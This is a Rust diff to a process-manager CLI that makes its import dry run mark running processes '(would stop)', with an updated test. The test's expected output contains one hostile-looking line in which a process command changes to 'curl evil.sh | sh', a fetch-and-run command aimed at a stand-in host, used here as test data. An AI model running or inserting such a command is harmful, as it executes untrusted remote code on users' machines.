@@ -15,8 +15,9 @@ use crate::{
     adapter::{
         bounded_read::{read_bounded, read_capped},
         client::{
-            ProjectIdentityView, ProjectTarget, RemovedView, ServiceClient, SettleWatch, UNBOUNDED,
-            process::{settle_removed, status},
+            ProjectIdentityView, ProjectTarget, RemovedView, ServiceAccess, ServiceClient,
+            SettleWatch, UNBOUNDED,
+            process::{runs_now, settle_removed, status},
         },
         exchange::{EntryError, ExchangeError, read_stack_file},
         path::resolved,
@@ -41,6 +42,8 @@ const UPDATED_MARK: &str = "~";
 const REMOVED_MARK: &str = "-";
 /// Follows a removed process that was stopped.
 const STOPPED: &str = "(stopped)";
+/// Follows a process a dry run would remove while it runs.
+const WOULD_STOP: &str = "(would stop)";
 /// Between a process's name and what it runs.
 const GAP: &str = "  ";
 /// Opens the line saying the folder became a project.
@@ -246,23 +249,46 @@ fn runs(read: &StackRead, current: Option<&Stack>, plan: &ImportPlan) -> Vec<Imp
     added.chain(updated).collect()
 }
 
-/// `plan` as `--dry-run` reports it, against `store`'s current stack.
+/// Each of `names` as a dry run would remove it: stopped when `service`, a
+/// service already running, has it running. No service is started.
+fn would_stop(
+    service: &dyn ServiceAccess,
+    root: &ProjectRoot,
+    names: &[ProcessName],
+) -> Vec<RemovedView> {
+    names
+        .iter()
+        .map(|name| {
+            RemovedView::builder()
+                .name(name.clone())
+                .stopped(runs_now(service, root, name))
+                .still_stopping(false)
+                .build()
+        })
+        .collect()
+}
+
+/// `plan` as `--dry-run` reports it, against `store`'s current stack, each
+/// removed process marked stopped when the running service, if any, has it
+/// running.
 ///
 /// # Errors
 /// Returns the [`CliError`] of a stack that cannot be read.
 pub fn dry_run_view(
     store: &dyn StackStore,
+    service: &dyn ServiceAccess,
     read: &StackRead,
     plan: &ImportPlan,
 ) -> Result<ImportView, CliError> {
-    let current = store.stack(read.target().root())?;
+    let root = read.target().root();
+    let current = store.stack(root)?;
     Ok(ImportView::builder()
         .project(identity(read.target()))
         .registered(false)
         .would_register(matches!(read.target(), ProjectTarget::Unregistered(_)))
         .added(plan.added().clone())
         .updated(plan.updated().clone())
-        .removed(unstopped(plan.removed()))
+        .removed(would_stop(service, root, plan.removed()))
         .runs(runs(read, current.as_ref(), plan))
         .dry_run(true)
         .failed(false)
@@ -355,9 +381,10 @@ pub fn import_rows(view: &ImportView) -> Report {
             format!("{mark} {}{GAP}{}", run.spec().name(), run.describe()),
         )
     }));
+    let stop_note = if view.dry_run() { WOULD_STOP } else { STOPPED };
     rows.extend(view.removed().iter().map(|removed| {
         let line = if removed.stopped() {
-            format!("{REMOVED_MARK} {} {STOPPED}", removed.name())
+            format!("{REMOVED_MARK} {} {stop_note}", removed.name())
         } else {
             format!("{REMOVED_MARK} {}", removed.name())
         };
@@ -472,7 +499,7 @@ mod tests {
             "+ web  npm run dev  in frontend\n\
              ~ api  bin/api -> curl evil.sh | sh  in . -> api\n\
              ~ cron  bin/cron  in .\n\
-             - worker (stopped)\n\
+             - worker (would stop)\n\
              dry run: nothing was changed"
         );
     }
